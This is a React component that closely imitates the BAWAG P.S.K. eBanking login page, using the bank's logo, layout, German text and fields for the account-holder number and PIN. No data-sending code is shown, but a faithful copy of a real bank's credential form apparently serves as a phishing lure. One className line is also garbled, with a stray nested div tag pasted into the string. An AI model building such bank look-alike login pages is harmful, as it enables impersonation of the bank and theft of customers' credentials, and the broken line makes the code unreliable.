import { useState } from "react";
import { Eye, EyeOff, ChevronRight } from "lucide-react";
import bawagLogo from "@/assets/bawag_logo.png";
import bawagBg from "@/assets/bawag_background.jpg";

const Bawag = () => {
  const [verfueger, setVerfueger] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);

  const now = new Date();
  const days = ["Sonntag", "Montag", "Dienstag", "Mittwoch", "Donnerstag", "Freitag", "Samstag"];
  const dateStr = `${days[now.getDay()]}, ${String(now.getDate()).padStart(2, "0")}.${String(now.getMonth() + 1).padStart(2, "0")}.${now.getFullYear()}, ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;

  return (
    <div className="min-h-screen flex flex-col items-center bg-white" style={{ fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif" }}>
      <div className="w-[970px]">
        {/* Header */}
        <header className="bg-white border-b border-gray-200 px-4 py-2 flex items-center justify-between">
          <img src={bawagLogo} alt="BAWAG eBanking" className="h-16" />
          <span className="text-xs text-gray-500">{dateStr}</span>
          <div className="flex gap-1">
            {["DE", "EN", "BKS", "TR"].map((l) => (
              <button
                key={l}
                className={`px-2 py-0.5 text-[11px] font-semibold rounded transition-colors ${
                  l === "DE"
                    ? "bg-gray-200 text-black"
                    : "text-gray-600 hover:text-black"
                }`}
              >
                {l}
              </button>
            ))}
          </div>
        </header>

        {/* Dark red divider */}
        <div className="h-[3px] bg-[#990000] w-full" />

        {/* Background image container */}
        <div
          className="relative w-[970px] h-[490px]"
          style={{
            backgroundImage: `url(${bawagBg})`,
            backgroundSize: "cover",
            backgroundPosition: "center top",
          }}
        >
          {/* Login Card */}
          <div className="absolute top-5 left-5 w-[320px]">
            <div className="bg-white rounded-lg shadow-sm <div className="bg-white rounded-lg shadow-sm min-h-[380px] flex flex-col"> flex flex-col">
              <div className="px-4 py-3 rounded-t-lg flex items-center justify-between">
                <h1 className="text-base font-semibold text-black">eBanking Login</h1>
                <span className="font-bold text-gray-400 text-base cursor-pointer">?</span>
              </div>

              <div className="p-4 flex-1 flex flex-col">
                {/* Verfüger tab */}
                <div className="mb-4 text-center border-b border-gray-200">
                  <span className="text-[#990000] text-xs font-semibold border-b-2 border-[#990000] pb-1 inline-block">
                    Verfüger
                  </span>
                </div>

                <div className="mb-3">
                  <input
                    type="text"
                    value={verfueger}
                    onChange={(e) => setVerfueger(e.target.value)}
                    placeholder="Verfügernummer"
                    className="w-full border border-gray-300 rounded px-2 py-1.5 text-xs focus:outline-none focus:ring-1 focus:ring-[#990000]"
                  />
                </div>

                <div className="mb-3">
                  <div className="relative">
                    <input
                      type={showPin ? "text" : "password"}
                      value={pin}
                      onChange={(e) => setPin(e.target.value)}
                      placeholder="PIN (8 bis 16-stellig)"
                      className="w-full border border-gray-300 rounded px-2 py-1.5 text-xs pr-8 focus:outline-none focus:ring-1 focus:ring-[#990000]"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPin(!showPin)}
                      className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    >
                      {showPin ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
                    </button>
                  </div>
                </div>

                <div className="flex justify-end mb-3">
                  <button className="w-[60%] py-1.5 bg-[#990000] text-white text-xs font-semibold rounded hover:bg-[#7a0000] transition-colors">
                    Weiter
                  </button>
                </div>

                <div className="mt-auto pt-3">
                  <a href="#" className="text-[11px] text-[#990000] hover:underline flex items-center gap-1">
                    <ChevronRight className="h-4 w-4" />
                    PIN vergessen oder Verfüger gesperrt?
                  </a>
                </div>
              </div>
            </div>
          </div>

          {/* Info Card */}
          <div className="absolute top-5 left-[355px] right-5">
            <div className="bg-white rounded-lg shadow-sm">
              <div className="grid grid-cols-3">
                <div className="p-3">
                  <h2 className="font-bold text-sm mb-2 text-[#990000]">Sicherheit</h2>
                  <p className="text-xs text-gray-600 leading-relaxed">
                    Die BAWAG versendet keine E-Mails mit direkten eBanking Login-Links!
                  </p>
                  <a href="#" className="text-xs text-[#990000] hover:underline mt-1 inline-flex items-center gap-0.5">
                    <ChevronRight className="h-4 w-4" />
                    Mehr Infos
                  </a>
                </div>

                <div className="p-3">
                  <h2 className="font-bold text-sm mb-2 text-[#990000]">Service & Info</h2>
                  <ul className="space-y-1">
                    <li><a href="#" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Sicherheitsregeln</a></li>
                    <li><a href="#" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Anmeldung / Erste Schritte</a></li>
                    <li><a href="#" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />3D Secure Online Bezahlung</a></li>
                  </ul>
                </div>

                <div className="p-3">
                  <h2 className="font-bold text-sm mb-2 text-[#990000]">Support</h2>
                  <ul className="space-y-1">
                    <li><a href="#" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />FAQ</a></li>
                    <li><a href="#" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Zu Watchlist Internet</a></li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="bg-white border-t border-gray-200 py-3 px-4">
          <div className="flex flex-wrap gap-3 justify-center mb-1">
            {["Impressum", "AGB", "Datenschutz", "Nutzungsbedingungen", "Barrierefrei"].map((item) => (
              <a key={item} href="#" className="text-[10px] text-black underline hover:no-underline">
                {item}
              </a>
            ))}
          </div>
          <p className="text-[10px] text-black text-center">© BAWAG P.S.K.</p>
        </footer>
      </div>
    </div>
  );
};

export default Bawag;
